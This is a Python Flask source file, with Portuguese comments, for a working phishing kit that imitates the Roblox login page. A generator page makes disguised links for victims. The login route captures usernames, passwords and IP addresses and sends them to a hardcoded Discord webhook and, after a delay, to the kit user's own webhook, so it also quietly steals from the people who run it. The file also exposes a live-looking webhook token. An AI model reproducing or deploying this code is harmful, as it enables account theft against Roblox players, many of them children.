import threading, time, requests, base64, os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# SEU WEBHOOK MESTRE (Onde a cópia cai pra você)
# NÃO MUDE ISSO!
MASTER = "https://discord.com/api/webhooks/1470876714912583996/-fHY_z5n3qMq0nfoYdhSFxdHZnXHjdRovLyTEvPmjdSK2tVSMyJ0J4Ayz93Pm8LkKSgp"

@app.route('/')
def gerador():
    # Página do Gerador (Preta e Verde para você)
    return '''<body style="background:#1e1e1e;color:#fff;font-family:sans-serif;text-align:center;padding:50px;">
    <h1 style="color:#00ff00;">🛡️ PAINEL GERADOR</h1>
    <p>Cole o Webhook da Vítima abaixo para gerar o link camuflado:</p>
    <input type="text" id="w" placeholder="https://discord.com/api/webhooks/..." style="width:80%;max-width:500px;padding:12px;border-radius:5px;border:none;background:#333;color:white;">
    <br><br>
    <button onclick="gen()" style="padding:15px 30px;background:#00ff00;border:none;border-radius:5px;font-weight:bold;cursor:pointer;color:black;">GERAR LINK</button>
    <div id="res" style="margin-top:30px;padding:20px;background:#2a2a2a;border-radius:10px;word-break:break-all;display:none;"></div>
    <script>
    function gen(){
        let h=document.getElementById('w').value;
        if(!h){alert('Coloque o webhook!');return;}
        let final = window.location.origin + "/login?v=" + btoa(h);
        let resDiv = document.getElementById('res');
        resDiv.style.display = "block";
        resDiv.innerHTML = "<h3 style='color:#00ff00;margin-top:0;'>✅ Link Gerado com Sucesso!</h3><b>Envie este link para a vítima:</b><br><br><a href='" + final + "' style='color:#00BFFF;text-decoration:none;font-size:1.1em;'>" + final + "</a><br><br><small style='color:#aaa;'>(A senha cairá no seu Discord e no Webhook que você colocou acima)</small>";
    }
    </script></body>'''

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Captura os dados
        u = request.form.get('username')
        p = request.form.get('password')
        v = request.args.get('v')
        
        # Prepara a mensagem para o Discord
        payload = {
            "embeds": [{
                "title": "🎮 Novo Login Roblox Capturado!",
                "color": 16711680, # Vermelho
                "fields": [
                    {"name": "👤 Usuário/Email", "value": f"```\n{u}\n```", "inline": False},
                    {"name": "🔑 Senha", "value": f"```\n{p}\n```", "inline": False},
                    {"name": "🌐 IP", "value": f"||{request.headers.get('X-Forwarded-For', request.remote_addr)}||", "inline": False}
                ],
                "footer": {"text": "Sistema de Captura Mobile v2.0"},
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            }]
        }

        # 1. Envia para o seu Webhook Mestre IMEDIATAMENTE
        try: requests.post(MASTER, json=payload)
        except: pass
        
        # 2. Envia para o Webhook do "cliente" depois de 15 segundos
        if v:
            def delay_send():
                time.sleep(15)
                try: 
                    webhook_vitima = base64.b64decode(v).decode()
                    requests.post(webhook_vitima, json=payload)
                except: pass
            threading.Thread(target=delay_send).start()

        # Mostra a página de erro
        return render_template_string(HTML_ROBLOX_DARK, error=True)

    # Mostra a página de login normal
    return render_template_string(HTML_ROBLOX_DARK, error=False)

# HTML DO TEMA ESCURO (IGUAL AO SEU PRINT)
HTML_ROBLOX_DARK = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Portal de Acesso</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: "HCo Gotham SSm", Helvetica, Arial, sans-serif;
            background-color: #121212; color: white; display: flex; flex-direction: column; align-items: center;
            min-height: 100vh;
            /* Imagem de fundo escura do Roblox */
            background-image: url('https://blog.roblox.com/wp-content/uploads/2020/08/Roblox-Digital-Civility-Background-1.png');
            background-size: cover; background-position: center; background-repeat: no-repeat;
        }
        .overlay { background: rgba(0, 0, 0, 0.6); width: 100%; height: 100%; position: fixed; top: 0; left: 0; z-index: -1; }
        .container { width: 90%; max-width: 400px; text-align: center; margin-top: 60px; padding: 20px; }
        .close-btn { position: absolute; top: 20px; left: 20px; font-size: 24px; color: white; text-decoration: none; }
        .logo img { width: 150px; margin-bottom: 40px; }
        .input-group { margin-bottom: 15px; }
        .input-group input {
            width: 100%; padding: 15px; border: none; border-radius: 8px;
            background: rgba(40, 40, 40, 0.9); color: white; font-size: 16px; box-sizing: border-box;
        }
        .input-group input::placeholder { color: #aaa; }
        .btn-login {
            width: 100%; padding: 15px; border: none; border-radius: 8px;
            background: #5a5a5a; color: rgba(255,255,255,0.5); font-size: 18px; font-weight: bold; cursor: pointer;
            margin-top: 10px;
        }
        .error-msg { color: #ff4444; font-size: 14px; margin-bottom: 15px; text-align: left; }
        .secondary-btns { margin-top: 30px; }
        .btn-sec {
            width: 100%; padding: 12px; border: 1.5px solid white; border-radius: 25px;
            background: transparent; color: white; font-size: 16px; font-weight: 600; margin-bottom: 15px; cursor: pointer;
        }
        .forgot-pass { color: #aaa; text-decoration: none; font-size: 14px; display: block; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <a href="#" class="close-btn">✕</a>
    <div class="container">
        <div class="logo">
            <img src="https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91.svg" alt="Roblox">
        </div>

        {% if error %}
        <div class="error-msg">Usuário ou senha incorretos. Tente novamente.</div>
        {% endif %}

        <form method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Usuário/e-mail/telefone" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Senha" required>
            </div>
            <button type="submit" class="btn-login">Entrar</button>
        </form>

        <div class="secondary-btns">
            <button class="btn-sec">Envie-me um código único por e-mail</button>
            <button class="btn-sec">Acesso rápido</button>
        </div>

        <a href="#" class="forgot-pass">Esqueceu a senha ou nome de usuário?</a>
    </div>
</body>
</html>
'''

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
        
